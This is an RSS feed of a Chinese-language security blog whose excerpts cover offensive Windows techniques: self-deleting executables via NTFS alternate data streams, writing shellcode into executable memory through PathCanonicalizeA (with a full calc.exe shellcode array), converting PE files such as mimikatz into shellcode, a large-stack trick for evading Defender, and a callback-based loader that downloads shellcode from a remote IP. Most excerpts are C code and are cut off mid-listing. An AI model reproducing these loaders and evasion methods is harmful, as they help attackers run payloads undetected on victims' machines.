<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Code on 2867a0</title>
    <link>https://github.com/2867a0/tags/code/</link>
    <description>Recent content in Code on 2867a0</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Sun, 11 Jun 2023 08:18:00 +0800</lastBuildDate>
    <atom:link href="https://github.com/2867a0/tags/code/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>利用ADS删除自身</title>
      <link>https://github.com/2867a0/posts/2023/adsdeleteself/</link>
      <pubDate>Sun, 11 Jun 2023 08:18:00 +0800</pubDate>
      <guid>https://github.com/2867a0/posts/2023/adsdeleteself/</guid>
      <description>ADS Microsoft于90年代初期引入了一种称为“数据流”的概念，从而使NTFS可以作为Macintosh客户端访问文件服务器的文件系统。因为Mac OS 是利用Mac的分层式文件系统（HFS)上所谓的资源分支数据流，用于存放图标等应用程序的元数据。NTFS和FAT的差别就是FAT由一个数据流构成，而NTFS可以在一个文件内存里面存储多个数据流。&#xA;在windows协议MS-FSA中ADS的定义：一个被命名的数据流是一个文件或者目录的一部分，它们可以独立于默认数据流被单独的打开。许多数据流的操作之影响数据流并不影响其他数据流，文件和目录&#xA;所有的文件在NTFS中至少包含一个主数据流，也就是用户可见的文件或是目录，一个文件在NTFS中真正的文件名称格式：&#xA;&amp;lt;文件名&amp;gt;:&amp;lt;流名&amp;gt;:&amp;lt;流种类&amp;gt; 文件ADS默认没有流名字，一个文件test.txt在NTFS中的全名为test.txt::$DATA&#xA;文件夹没有默认的数据流（也就是没有主数据流），但是有一个默认的目录流为$INDEX_ALLOCATION，默认的流名为$I30。比如文件夹testDir全名为testDir:$I30:$INDEX_ALLOCATION&#xA;假设查看文件1.txt的数据流内容，可以输入如下命令，其内容和1.txt是一样的，在数据流中添加的内容保存后会被写入对应的文件中。如下图，原来1.txt中只有内容1.txt，在数据流中写入2，保存后重新打开原文件，发现2被写入&#xA;notepad.exe 1.txt::$DATA 简单提一下，用微软的streams.exe工具可以遍历出程序的备用数据流&#xA;自删除 自删除原理是，将文件重命名为数据流格式，然后删除该数据流。利用这种方法去删除可以无视当前文件句柄占用，如果程序处于运行中也不会破坏程序的运行。&#xA;代码如下，首先以DELETE方式获取自身文件句柄，调用SetFileInformationByHandle()将文件名修改为:anyany，以调试编译运行的时候SetFileInformationByHandle()函数会报错，忽略就行。&#xA;修改完成后重新打开一次文件句柄，再次调用SetFileInformationByHandle()删除文件&#xA;程序执行，自删除文件，后续的代码依旧可以运行&#xA;上面的代码中我设置了两个暂停，第一个pause中，如果以代码调试的方式打开程序，CreateFileW函数会获取不到文件句柄，解决方法也简单，x64gbd附加到进程就可以调试了。&#xA;第二个pause是在将文件修改为数据流之后，用winhex创建磁盘快照可以发现，原来的程序变成了0B，进入程序之后any文件其实就是原来的程序&#xA;从上面可以看出，我们在第一次rename的时候是将程序移动到了数据流中（磁盘中会有一个0B的文件），第二次删除的时候删除的0B文件是我们的数据流文件。&#xA;这里还有一个点，在第一次rename文件之后如果不关闭程序的句柄（也就是一直暂停到第二个pause），火绒剑操作这个文件的时候会卡死&#xA;完整代码 CloseSelf.h&#xA;#pragma once #pragma comment(lib, &amp;#34;Shlwapi.lib&amp;#34;) #include &amp;lt;Windows.h&amp;gt; #include &amp;lt;shlwapi.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #define DS_STREAM_RENAME L&amp;#34;:anyany:$DATA&amp;#34; #define DS_DEBUG_LOG(msg) wprintf(L&amp;#34;[LOG] - %s\n&amp;#34;, msg) BOOL ds_deposite_handle(HANDLE hHandle); BOOL ds_rename_handle(HANDLE hHandle); HANDLE ds_open_handle(PWCHAR pwPath); CloseSelf.cpp&#xA;#include &amp;#34;CloseSelf.h&amp;#34; HANDLE ds_open_handle(PWCHAR pwPath) { return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); } BOOL ds_rename_handle(HANDLE hHandle) { FILE_RENAME_INFO fRename; RtlSecureZeroMemory(&amp;amp;fRename, sizeof(fRename)); // set our FileNameLength and FileName to DS_STREAM_RENAME LPWSTR lpwStream = (LPWSTR)DS_STREAM_RENAME; fRename.</description>
    </item>
    <item>
      <title>Write Memory Trick</title>
      <link>https://github.com/2867a0/posts/2023/writememorytrick/</link>
      <pubDate>Wed, 22 Mar 2023 07:12:30 +0800</pubDate>
      <guid>https://github.com/2867a0/posts/2023/writememorytrick/</guid>
      <description>[TOC]&#xA;vx-underground档案中记载的技巧，用一些非常见的函数写入shellcode到内存。原文来自xss.is论坛，这里只记录复现出来的函数。&#xA;PathCanonicalizeA 源代码如下，首先HeapCreate()、HeapAlloc()分配dst_shellcode内存空间，使用PathCanonicalizeA()函数将源shellcode逐字节复制到dst_shellcode，修改dst_shellcode内存空间权限为RWX，最后调用**InitOnceExecuteOnce()**执行。&#xA;PathCanonicalizeA函数在使用的时候有两个问题，一是遇到0x00字符时终止，二是长度不能过长。所以需要确保源shellcode不能有坏字符，同时shellcode长度不能过长。代码里面是将源shellcode先写到数组，再将数组内容复制到dst_shellcode内存空间。&#xA;#include &amp;lt;Windows.h&amp;gt; #include &amp;lt;Shlwapi.h&amp;gt; #pragma comment(lib, &amp;#34;Shlwapi.lib&amp;#34;) bool test1() { // x64 calc.exe shellcode // https://www.exploit-db.com/shellcodes/49819 unsigned char orig_shellcode[] = &amp;#34;\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b&amp;#34; &amp;#34;\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2&amp;#34; &amp;#34;\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b&amp;#34; &amp;#34;\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04&amp;#34; &amp;#34;\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0&amp;#34; &amp;#34;\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2&amp;#34; &amp;#34;\x48\x83\xec\x20\x41\xff\xd6&amp;#34;; size_t ori_shellcode_size = sizeof orig_shellcode; LPVOID copied_shellcode = NULL; HANDLE heap = NULL; BOOL ret = 0; int size = 0; heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); copied_shellcode = HeapAlloc(heap, 0, ori_shellcode_size); ZeroMemory(copied_shellcode, ori_shellcode_size); // copy shellcode for (size_t i = 0; i &amp;lt; ori_shellcode_size; i++) { char temp[2] = { 0 }; temp[0] = orig_shellcode[i]; if (!</description>
    </item>
    <item>
      <title>Pe To Shellcode</title>
      <link>https://github.com/2867a0/posts/2023/petoshellcode/</link>
      <pubDate>Fri, 03 Mar 2023 08:00:00 +0800</pubDate>
      <guid>https://github.com/2867a0/posts/2023/petoshellcode/</guid>
      <description>原项目地址&#xA;pe2shc 先把它转成vs项目，程序入口接受两个参数，待转换文件和转换后文件输出路径&#xA;首先执行的是is_supported_pe()函数。读取源文件，按照内存对齐方式将数据读取到内存，判断是否为可以转换的程序&#xA;存在重定位表 不支持.NET程序 检查完成之后释放申请的内存空间，重新申请一块新的内存空间并内存对齐方式读取到内存，shellcodify()函数就是真正要转换的逻辑&#xA;函数先从资源区读取stub代码，这个代码就是stub64.bin中的代码。再申请一块新的内存空间（就叫他扩展内存空间），将展开后的PE和stub代码都放到扩展内存空间中，stub代码会被放在PE数据的末尾。接着执行overwrite_hdr()函数。&#xA;overwrite_hdr()会修改扩展空间前32个字节，也就是源文件DoS头的前32字节。 下图中00 16 60 00转换为10进制是1466368，是源程序内存展开后的大小，将这个数值写入redir_code，程序在执行到这里会跳转到(源程序内存展开后的首地址 + 1466368)地址，也就跳到了stub代码区&#xA;目前，我们的源程序以内存对齐方式被读取在扩展空间，源程序的DoS头被修改（跳转到stub代码），stub代码被存放在程序的末尾。&#xA;源代码中，到这里就开始执行保存逻辑了。在保存之前：&#xA;判断程序是否需要修复导入表（这里用的是mimikatz作为源程序，没做导入表的修复） 修改节表中文件对齐地址为内存对齐后的地址 最后将内存中的数据保存到文件。因为节区块是按照内存对齐进行保存的，又有stub代码附加到了源程序的末尾，新生成的程序会比源程序大不少&#xA;stub 代码 附加到文件末尾的二进制代码是stub64.bin，它的源代码是loader_v2项目编译生成的。&#xA;将stub64.bin拖到IDA里面配合loader_v2源代码分析，stub_main()函数就是程序跳转后要执行的第一个函数，首先初始化需要的函数地址，从PEB表里面拿到kernel32的地址，从kernel32中遍历出LoadLibraryA、GetProcAddress函数的地址&#xA;然后判断参数1指向的地址能否被解析成PE结构，v4参数取的是DoS头中的第32个字节，在DoS头里面一般是0，所以主要看case 0的逻辑。&#xA;NT头+176指向的是BaseRelocationTable的首地址，确保重定位表存在。 修复重定位表，修复导入表，修复TLS表&#xA;最后，找到程序的AddressOfEntryPoint，判断是DLL还是exe执行&#xA;总体来说这个项目用到的还是PE结构的相关知识，和PE内存加载的逻辑很相似。利用这个项目转换出来的程序既可双击执行，也可以直接扔到内存中加载</description>
    </item>
    <item>
      <title>Big Stack bypass</title>
      <link>https://github.com/2867a0/posts/2023/bigstack/</link>
      <pubDate>Mon, 13 Feb 2023 08:00:00 +0800</pubDate>
      <guid>https://github.com/2867a0/posts/2023/bigstack/</guid>
      <description>[TOC]&#xA;2022年底国外技术人员发现的技巧，在内存中分配一个大的堆栈，defender就检测不了了。&#xA;测试用的是x64 metasploit 生成的 calc，原文中是硬编码栈内容，生成非常大。下面的代码时创建一个动态数组，将shellcode放到数组末尾，武器化可以远程拉取shellcode。&#xA;visual studio编译需要设置字符集为多字节、堆栈提交大小为200000，堆栈大小可以自己定义&#xA;修改后的完整代码：&#xA;#include &amp;lt;windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;time.h&amp;gt; #include &amp;lt;random&amp;gt; typedef LPVOID (WINAPI* VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); typedef BOOL (WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD); typedef HANDLE (WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); unsigned char sVirtualProtect[] = { &amp;#39;V&amp;#39;,&amp;#39;i&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;u&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;P&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;o&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;c&amp;#39;,&amp;#39;t&amp;#39;, 0x0 }; unsigned char sVirtualAlloc[] = { &amp;#39;V&amp;#39;,&amp;#39;i&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;u&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;A&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;o&amp;#39;,&amp;#39;c&amp;#39;,0x0 }; unsigned char sCreateThread[] = { &amp;#39;C&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;T&amp;#39;,&amp;#39;h&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;d&amp;#39;,0x0, }; #define STACKSIZE 2000000 int main (VOID) { //msfvenom calc payload // msfvenom --platform windows --arch x64 -p windows/x64/exec CMD=calc.</description>
    </item>
    <item>
      <title>回调函数加载器</title>
      <link>https://github.com/2867a0/posts/2022/callback-function/</link>
      <pubDate>Sun, 13 Nov 2022 22:53:46 +0800</pubDate>
      <guid>https://github.com/2867a0/posts/2022/callback-function/</guid>
      <description>是github项目AlternativeShellcodeExec中提到的一些函数可以用来执行shellcode&#xA;项目里面还有很多函数可以利用，因为是在本地线程执行shellcode的，所以这里只贴出其中一个完整的利用代码&#xA;#include &amp;lt;windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;wincrypt.h&amp;gt; #include &amp;lt;WinInet.h&amp;gt; #pragma comment(lib, &amp;#34;WinInet.lib&amp;#34;) // Requires Crypt32.lib // 需要在链接器 -&amp;gt; 输入 -&amp;gt; 附加依赖项 中添加如下库 /* kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib Crypt32.lib */ // 定义结构体 typedef struct { char* shellcode; int size; } SHELLCODO, * PSHELLCODE; BOOL downloadShellcode(LPCWSTR url, int port, LPCWSTR payloadPath, BOOL isEncrypted, PSHELLCODE pShellcode); int main() { SHELLCODO shellcode = { 0 }; BOOL s = downloadShellcode(L&amp;#34;192.</description>
    </item>
  </channel>
</rss>
